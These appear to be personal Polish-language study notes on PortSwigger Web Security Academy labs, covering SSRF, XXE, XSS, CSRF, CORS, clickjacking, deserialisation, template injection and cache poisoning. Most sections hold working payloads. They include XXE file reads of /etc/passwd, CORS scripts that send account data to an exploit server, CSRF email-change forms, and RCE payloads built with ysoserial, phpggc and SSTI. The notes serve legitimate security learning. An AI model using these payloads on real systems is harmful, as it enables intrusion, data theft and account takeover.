# PORTSWIGGER NOTATKI

## Lab: Inconsistent handling of exceptional input
## Lab: Authentication bypass via flawed state machine
## Lab: Authentication bypass via encryption oracle
## Lab: Authentication bypass via information disclosure ->
## Lab: Information disclosure in version control history -> .git
## Lab: Method-based access control can be circumvented -> pamiętać, żeby zmienić session cookie
## Lab: Web shell upload via extension blacklist bypass -> do zrobienia
## Lab: Remote code execution via polyglot web shell upload -> Ważne żeby sobie dodać przed i po ścieżce START i STOP bo się znaki mogą zmienić 

# SSRF

Lab: SSRF with whitelist-based input filter
1. omijanie whitelisty -> musimy dopasować stock.weliketoshop.net
2. user@strona.pl -> wchodzimy na stronę z whitelisty jako user, tutaj [localhost]
3. http://localhost%252f@stock.weliketoshop.net/admin/delete?username=carlos -> dalsze części zapytania już po stronie z whitelisty
4. zamiana slasha na `%252f` (podwójne encodewanie URL), aby ominąć zabezpieczenia
Jak to działa (chyba)?
	1. serwer sprawdza czy to co jest wpisane jest na whiteliście
		- używa regexa, który szuka najbliższego znaku który zasugeruje że skończyła się nazwa domeny (dlatego encodujemy / dwa razy, żeby przepuścił go jako normalny znak, dalej widzi @, która nie stopuje i zatrzymuje się dopiero na nie-encodowanym /)
	2. przepuszcza zapytanie, ale przez to że dopisaliśmy / przed @ teraz uznaje localhost za link, a nie usera)

## Lab: SSRF with filter bypass via open redirection vulnerability
1. sprawdzamy działanie parametru stockApi, który sprawdza liczbę dosenych produktów i nier pozwala on na wysłanie zapytania na inną stronę
2. sprawdzamy przycisk [next product] i widzimy, że istnieje zapytanie `/product/nextProduct?path=/...`
3. dodajemy to zapytanie do stockApi z path=nasz_serwer i zapytanie się wykonuje

# XXE

## Lab: Exploiting XXE to perform SSRF attacks
1. mamy endpoint, który używa XML
2. wpisujemy `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
3. znajdujemy miejsce, w którym jest sprawdzana wartość i mamy zwracane [Invalid argument: nazwa folderu] 
4. po kolei dopisujemy kolejne foldery ze ścieżki, aż dochodzimy do rozwiązania

## Lab: Exploiting blind XXE to retrieve data via error messages
1. na naszym serwerze tworzymyh payload:
``` 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- tworzy on referencję do zmiennej (% file), do której załadowujemy zawartość /etc/passwd
- tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
- w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
2. na serwerze dodajemy część kodu z zapytaniem:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
3. serwer wysyła zapytanie i zwracany jest błąd z nazwą ścieżki, która nie istnieje (bo jest to zawartość pliku /etc/passwd)
notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są entity, a w tym payloadzie, który wysyłamy entity tworzy się dopiero na serwerze


## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
1. poprzez zapytania w typowe miejsca z pikami dtd (Document Type Definition) tj.:
``` 
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
2. jeśli plik nie istnieje zwracany jest błąd
3. dowiadujemy się, że w pliku zdefiniowana jest zmienna ISOamso, bo pliki dtd zazwyczaj są opensource
4. widząc to robimy payload:
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
- tworzy się entity do którego wpisujemy zawartość pliku docbookx.dtd
- nadpisujemy entity o nazwie ISOamso, dzięki czemu nie zostanie ono zablokowane
- dalej podobnie jak wcześniej wpisujemy zawartość /etc/passwd, a potem zwracamy błąd z jego zawartością

notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwerem, datego poprzez nadpisanie tego z wnętrza serwera możemy obejść to zabezpieczenie



## Lab: Exploiting XInclude to retrieve files
1. jest to przypadek, że nie mamy dostępu do całego dokumentu XML, a jedynie podajemy parametry do niego
2. należy użyć wtedy `XInclude`, który pozwala na budowanie dokumentów XML, z sub-dokumentów
3. Zamiast parametru podajemy zatem payload (zakodowany URL, zeby mógł być argumentm):
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
4. Wtedy dosatemy informację: [Invalid product ID: zawartość /etc/passwd]


## Lab: Exploiting XXE via image file upload
XML w obrazie SVG:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
# XXS

Lab: Reflected XSS into HTML context with most tags and attributes blocked
1. Widzimy, że blokowane są tagi html
2. Enumerujemy po wszystkich i okazuje się, że jako jedyny blokowany nie jest body
3. Blokowane również są eventy.
4. Enumerujemy po wszyskiech eventach i widzimy, że nie jest blokowany onresize
5. Teraz należy wysłać payload do ofiary:
- konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize

```
<iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
```

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones ->> TODO
```
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## Lab: Reflected XSS with some SVG markup allowed
1. enumerujemy po tagach i eventach
2. dostępny jest tylko event onbegin i tagi svg, image, title, animatetransform
3. z tego tworzymy: 
```
<svg><animatetransform onbegin=alert(1)>
```
Jeśli jesteśmy wewnątrz skryptu:
```
" autofocus onfocus=alert(document.domain) x="
```
Jeśli jesteśmy wewnątrz jakiegoś elementu np <img src="[]"...>:
```
"><script>alert(document.domain)</script>
```
Jeśli jesteśmy wewnątrz stringa w skrypcie:
```
'-alert(document.domain)-'
';alert(document.domain)//
```
Jeżeli jest escapowany znak (używany w tym celu backslash) to można dać przed nim \\\\:
wtedy jeżeli payload jest równy:
``` 
\';alert(document.domain)//
```
po próbie escapowania ' będzie wyglądał tak:
```
\\';alert(document.domain)//
```
a tym samym zamiast escapowania ' zescapowany zostanie backslash, a zatem będzi uznany jako zwykły znak, a nie specjalny.	

Jeżeli escapowany jest również backslash możemy użyć predefiniowanych entity javascripta do znaków np.: \&apos; to ':
```
&apos;-alert(document.domain)-&apos;
```
Można również użyć:
```
${alert(document.domain)}
```
# DOM BASED XSS 

Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
- Wtedy użyć można <frame> albo <img>

Jeżeli mamy on hashchange to można użyć:
```
<iframe src="https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
```
jak exploit, albo
```
https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#<img src=1 onerror=print()>
```
Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framework:
```
{{$on.constructor('alert(1)')()}}
```

## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
1. payload wprowadzony jest do wnętrza skryptu, jednak nie możemy "wyjść" ze stringa, bo znak ' jest usuwany
2. możemy jednak zakończyć całą sekcje skryptu dając payload:
``` 
</script><img src=1 onerror=alert()>
```

## Lab: Reflected DOM XSS
1. Patrzymy na zwracaną wartość:
```
{"results":[],"searchTerm":"podana_wartość"}
```
2. Widzimy jakie znaki są escapowane, podajemy wartość:
```
\"-alert(1)}//
```
3. Co zamienia się w:
```
"\\"-alert(1)}//"
```
i mamy:
```
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

# CSRF

## Lab: CSRF vulnerability with no defenses
### Skrypt zmieniający adres e-mail:
```
    <html>
        <body>
            <form action="https://0ac4006304f120fbc02b4be100cd00c7.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```
## Lab: CSRF where token is not tied to user session
1. Generujemy CSRF dal użytkownika, wysyłając zapyanie o zmiane maila, zapisujemy je i dropujemy request
2. Sprawdzamy na drugim użytkowniku że podniana jego tokenu na ten działa
3. robimy skrypt, który uruchamia zminae maila z dodanym wcześniej wygenerowanym tokenem
```
    <html>
        <body>
            <form action="https://0a7400fb04acc082c085a8ac00ef0031.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
                <input type="hidden" name="csrf" value="T27pLkAbqM1BfdJFpw8mEzkHWkTtIM0O" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```

- `%0d%0a` -> nowa linia

## Lab:CSRF token is tied to a non-session cookie
1. Jeśli mamy do zmiany dwa parametry warto użyć
<img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
```
    <html>
        <body>
            <form action="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
                <input type="hidden" name="csrf" value="iDJaenyZIgBuL3FulGTs64h3SdAfNrIC" />
            </form>
            <img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">
        </body>
    </html>
```

## Lab: CSRF where Referer validation depends on header being present 
1. Z racji, że po usunięciu nagłówka Referer pomijane jest jego sprawdzenie, to należy dodać `<meta name="referrer" content="never">`, który informuje stronę, any takiego nagłówka nie dodawać
2. Cały payhload wygląda tak:
``` 
    <html>
        <body>
            <meta name="referrer" content="never">
            <form action="https://0ab0001b03ab5131c0f5dffe00e50064.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```

## Lab: CSRF with broken Referer validation
1. Ochrona przed CSRF polega na sprawdzaniu pola Referer w nagłówku, sprawdzanie polega jednak tylko na tym czy jest w nim strona, której szuka regex tj. działa również:
`	dobra_strona.zła_strona.com`
`	zla_strona.pl/dobra_strona`
2. Dodatkowo w przeglądarce z zasady ucianae jest to co po slashu, a aby temu zapobiec należy dodać pole `Referrer-Policy: unsafe-url` i wtedy wszystko działa, a linkiem w serwerze jest `strona_z_exploitem.com/dobra_strona`

# CORS

## Lab: CORS vulnerability with basic origin reflection
1. Dopuszczalne jest zapytanie z każdej strony
2. Wystarczy zatem skonstruować taki skrypt:
```
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0aca001603b191f3c09503240075004c.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
    
        function reqListener() {
            location='/log?key='+this.responseText;
        };
    </script>
```

## Lab: CORS vulnerability with trusted null origin
1. Wpisując różne Origin do requesta widzimy że dostajemy nagłówek `Access-Control-Allow-Origin: null` dla wartości Origin: null
2. WAŻNE: to że dostajemy odpowiedź nic nie znaczy, ważne jest żeby był nagłówek, bo nie chodzi o to że będzie blokowany request, a wykonywanie skryptów i przekierowanie cookie
3. Aby w Origin uzyskać wartość null używamy iframe:
```
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a31007a0301b17dc03f469300ec009e.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
    location='https://exploit-0a8a000d0307b198c0d6462c01c400a8.web-security-academy.net/log?key='+this.responseText;
    };
    </script>"></iframe>
```

## Lab: CORS vulnerability with trusted insecure protocols

1. Zapytania mogą być generowane jedynie z subdomen
2. Znajdujemy podatność XSS w subdomenie http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net
3. Jako productId możemy wpisać skrypt i będzie on wykonany z tej właśnie subdomeny
4. Konstruujemy skrypt i dodajemy do na exploit server:

### Payload
```
    <script>
        document.location="http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net/?productId=4
    	<script>
    	    var req = new XMLHttpRequest(); 
    	    req.onload = reqListener; 
    	    req.open('get','https://0a100003032beefac0af231c00de0028.web-security-academy.net/accountDetails',true); 
    	    req.withCredentials = true;
    	    req.send();
    
    	    function reqListener() {
    	    location='https://exploit-0a2f009e035fee0ec04523210103003d.web-security-academy.net/log?key='%2bthis.responseText; 
    	    };
    	%3c/script>
        &storeId=1"
    </script>
```

# CLICKJACKING
```
    <head>
    	<style>
    		iframe {
    			position:relative;
    			width:700px;
    			height:600px;
    			opacity:0.51;
    			z-index:2;
    			}
    		div {
    			position:absolute;
    			top:500px;
    			left: 80px;
    			z-index:1;
    			}
    	</style>
    </head>
```
```
    <body>
            <div>
            <button>click</button>
            </div>
    	<iframe src="https://0ae300220338ea26c0e098a70076003a.web-security-academy.net/my-account"> </iframe>
    </body>
```
### Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
```
<iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
```


# DOM-based vunabilities

## Web messages
```
<iframe src="https://0ad400b70311a7c0c07419ee0014008f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
	
## Lab: DOM XSS using web messages and a JavaScript URL
1. Widzimy, że stroma pobiera wartość message i sprawdza, czy zawiera http: lub https:, jeśli tak wpisuje ją do href, jeśli nie to nie:
2. Konstruujem zatem payload, który zawiera wywołanie funkcji print, a także słowo http, które poprzedzamy //, aby był to komentarz:
```
<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## Lab: DOM XSS using web messages and JSON.parse
1. Jest to przykład z użyciem JSON.parse, który zmienia string w JSON, należy pamiętać, aby escapować znaki " w stringu, bo inaczej zrobią się z tego osobne stringi i nie zadziała
```
<iframe src="https://0ab200c5041cbdb3c018c71b008d0084.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
```

## Lab: DOM-based open redirection
https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#/url=https://exploit-0a04009b032a3781c0eaade3010e0095.web-security-academy.net


## Lab: DOM-based cookie manipulation
1. W cookie zapisywana jest poprzednia odwiedzana podstrona, możemy zatem ją zmienić , a także dodać skrypt.
2. WAŻNE! - warto sprawdzać dodawanie pojedynczych i podwojnych cudzysłowiów, bo strona nawet pojedyncze tłumaczy na podwójne i potem nie działa
3. działanie skryptu
	- ładujemy stronę z iframea, a do cookie zostanie wpisany lkiink
	- następnie robimy redirect, wtedy załaduje się link do przycisku, a tym samym wykona się skrypt

### Payload:
```
<iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
```

`Możliwa obfuskacja alert() może być alert```


# INSECURE DESERIALISATION
## PHP
`String -> s:size:value;`
`Integer -> i:value;`
`Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')`
`Null -> N;`
`Array -> a:size:{key definition;value definition;(repeated per element)}`
`Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}`

## Java
```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
```
- tworzy dane zserializowane wykonujące daną komendę


### Lab: Exploiting PHP deserialization with a pre-built gadget chain
1. Jako cookie mamy: `{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwYjhyaTRoanV4Z2N4Zjg3NWhkdHVnYWtoenBnenozZyI7fQ==","sig_hmac_sha1":"5cb7fbbf74d7f2378516e66ab7b6000df40b94bd"}`
2. Kiedy spojrzymy na wartość tokenu okazuje się, że oznacza ona: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pb8ri4hjuxgcxf875hdtugakhzpgzz3g";}`
3. Na stronie w komentarzu znajdujemy informacje o ścieżce do pliku php_info.php
4. W środku znajdujemy `SECRET_KEY`, okazuje się, że `sig_hmac_sha1` to podpisana wartość tokenu tym właśnie kluczem
5. W momencie błedu widać, że wykorzystywany jest framework o nazwie `[Symfony Version: 4.3.6]`
6. Generujemy payload za pomocą funkcji: `phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
7. token podmieniamy na tę wartość, a następnie tworzymy skrót `hmac-sha1` i dodajemy jego wynik za `sig_hmac_sha1`
8. Wysyłamy cały payload i działa

# SERVER-SIDE TEMPLATE INJECTION
## Testy:
```
${{<%[%'"}}%\
http://vulnerable-website.com/?username=${7*7}
```
## Payloady:
### Freemaker
```
<%= system("rm morale.txt") %> -> RUBY ERC
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
```

### handlebars
```
    wrtz{{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
                {{this.pop}}
                {{this.push (lookup string.sub "constructor")}}
                {{this.pop}}
                {{#with string.split as |codelist|}}
                    {{this.pop}}
                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                    {{this.pop}}
                    {{#each conslist}}
                        {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                        {{/with}}
                    {{/each}}
                {{/with}}
            {{/with}}
        {{/with}}
    {{/with}} -> handlebars
```

### django
```
{{settings.SECRET_KEY}} -> django
{% debug %} -> django
```

# WEB CACHE POISONING

## Lab: Web cache poisoning with multiple headers
1. Za pomocą Param Miner znajdujemy, dwa "unkeyd" parametry: X-Forwarded-Host i X-Forwarded-Scheme
2. bierzemy zapytanie GET na /resources/.../....js
3. Widzimy, że jeżeli w nagłówku X-Forwarded-Scheme damy cokolwiek innego niż https, to zostaniemy przekierowani na stronę z https
4. Jeśli następnie dodamy nagłówek X-Forwarded-Host, to widzimy, że zostajemy przekierowani właśnie na tę stronę
5. Na exploit serwerze ustawiamy link /resources/.../....js ui dodajemy tam alert()
6. Kiedy strona po tym jak "poisonujemy" cache bedzie załadowywać skrypt z naszej strony

## Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
1. Sprawdzamy jakie nagłówki działają w Param Minerze i znajdujemy X-Forwarded-Host
2. Widzimy, że to pole wstawiane jest jako adres do /resources/json/geolocation.json
3. Z pliku geolocation.js widzimy, że używany jest parametr "country"
4. Dodajemy zatem na exploit serwer payload
```
{ "country": "<img src=1 onerror=alert(document.cookie)>" }
```
5. Do nagłówka dodajemy także `Access-Allow-Origin: *`, aby ominąć CORS

## Lab: Web cache poisoning via an unkeyed query string
1. Zauważamy, że niezależnie od dodania parametrów w `GET /`, cały czas dostajemy ten sam cache, oznacza to, że patametry są "unkeyd"
2. Używając Param Minera, znajdujemy nagłówek Origin, który można użyć jako cahce bustera
3. Link, który podajemy w parametrze get jest wpisywany do pola head
4. Aby wyjść z pola i wykonać skrypt używamy payloadu:
```
GET /?param='><script>alert(1)</script>
```
## Lab: Web cache poisoning via an unkeyed query parameter
1. Tym razem parametry w `/ GET` wpływają na cache'owanie strony
2. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
3. Dalej tak samo jak w poprzednim zadaniu:
```
GET /?utm_content='><script>alert(1)</script>
```
## Lab: Parameter cloaking
1. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
2. Znajdujemy plik /js/geolocate.js, który wywoływany jest przy ładownaiu strony zapytaniem /js/geolocate?callback=setCountryCookie
3. Próbując wpisywać różne payloady zayważamy, że `;` nie przerywa zapytania, a jest interpretowany jako dalsza część parametru
4. Inaczej jest jednak na back endzie, gdzie jest interpretowany jako przerwa i następuje po nim inna zmienna
5. Dodatkowo jeżeli znienne mają takie same nazwy pierwsza zostaje nadpisana przez drugą, jednak w cachu zostaje zapamiętana pierwsza z nich
6. Konstruujemy zatem payload
``` 
GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert
```
Co się dzieje?
- serwer cachujący widzi zapytanie z dwoma parametrami: 
	- `callback=setCountryCookie`, które jest kluczem w cachu oraz 
	- `utm_content=123;callback=alert` czyli parametr utm_content, który cachowany nie jest
	- SERWER ZATEM CACHUJE ZAPYTANIE DLA `callback=setCountryCookie`
- serwer na backendzie (tutaj Ruby on Rails) widzi trzy parametry:
	- `callback=setCountryCookie`
	- `utm_content=123`
	- `callback=alert`, I NIM NADPISUJE PIERWSZY Z PARAMETRÓW
